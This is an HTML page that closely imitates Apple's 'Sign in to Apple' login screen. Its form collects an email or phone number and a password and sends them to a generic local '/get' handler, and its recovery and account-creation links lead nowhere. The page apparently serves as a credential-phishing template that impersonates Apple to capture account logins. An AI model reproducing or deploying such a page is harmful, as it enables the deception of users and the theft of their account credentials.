<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
    <title>Sign in - Apple Store</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', 'Helvetica Neue', sans-serif;
            background: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 80px 20px 40px;
        }

        .container {
            width: 100%;
            max-width: 480px;
        }

        .title {
            font-size: 28px;
            font-weight: 600;
            color: #1d1d1f;
            text-align: center;
            margin-bottom: 40px;
        }

        .form-group {
            position: relative;
            margin-bottom: 16px;
        }

        .input {
            width: 100%;
            height: 56px;
            padding: 16px 50px 16px 18px;
            border: 1px solid #d2d2d7;
            border-radius: 12px;
            font-size: 17px;
            color: #1d1d1f;
            background: #fff;
            outline: none;
        }

        .input::placeholder {
            color: #86868b;
        }

        .input:focus {
            border-color: #0071e3;
            box-shadow: 0 0 0 3px rgba(0, 113, 227, 0.2);
        }

        .submit-btn {
            position: absolute;
            right: 14px;
            top: 50%;
            transform: translateY(-50%);
            width: 30px;
            height: 30px;
            background: none;
            border: none;
            cursor: pointer;
            padding: 0;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .submit-btn svg {
            width: 26px;
            height: 26px;
        }

        .remember-section {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin: 48px 0 24px;
        }

        .remember-section input[type="checkbox"] {
            width: 18px;
            height: 18px;
            cursor: pointer;
        }

        .remember-section label {
            font-size: 14px;
            color: #1d1d1f;
            cursor: pointer;
        }

        .links {
            text-align: center;
        }

        .link {
            display: inline-flex;
            align-items: center;
            gap: 2px;
            color: #0066cc;
            text-decoration: none;
            font-size: 14px;
            margin-bottom: 12px;
        }

        .link:hover {
            text-decoration: underline;
        }

        .link-arrow {
            font-size: 11px;
        }

        .create-section {
            font-size: 14px;
            color: #1d1d1f;
        }

        .create-section a {
            color: #0066cc;
            text-decoration: none;
        }

        .create-section a:hover {
            text-decoration: underline;
        }

        @media (max-width: 520px) {
            body {
                padding: 40px 20px;
            }
            .title {
                font-size: 24px;
            }
        }
    </style>
</head>
<body>
<div class="container">
    <h1 class="title">Sign in to Apple</h1>

    <form action="/get" id="email-form-step">
        <div class="form-group">
            <input type="text" name="email" class="input" placeholder="Email or Phone Number" required>
        </div>

        <div class="form-group">
            <input type="password" name="password" class="input" placeholder="Password" required>
            <button type="submit" class="submit-btn">
                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                    <circle cx="12" cy="12" r="11" fill="none" stroke="#86868b" stroke-width="1"/>
                    <path d="M10 8l4 4-4 4" fill="none" stroke="#86868b" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
            </button>
        </div>

        <div class="remember-section">
            <input type="checkbox" id="remember">
            <label for="remember">Remember me</label>
        </div>

        <div class="links">
            <a href="#" class="link">Forgot password? <span class="link-arrow">↗</span></a>
            <br>
            <p class="create-section">
                Don't have an Apple Account? <a href="#">Create Your Apple Account <span class="link-arrow">↗</span></a>
            </p>
        </div>
    </form>
</div>
</body>
</html>
